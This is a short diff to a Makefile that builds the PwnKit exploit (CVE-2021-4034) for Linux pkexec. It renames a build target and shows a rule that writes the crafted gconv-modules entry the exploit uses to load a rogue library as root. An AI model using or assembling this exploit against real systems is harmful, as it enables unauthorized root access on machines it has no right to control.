@@ -1,7 +1,7 @@
 #!bin/bash
 
 .PHONY: all
-all: pwnkit.so cve-2021-4034 gconv-modules gconvpath
+all: pwnkit.so exploit gconv-modules gconvpath
 
 gconv-modules:
 	echo "module UTF-8// PWNKIT// pwnkit 1" > $@
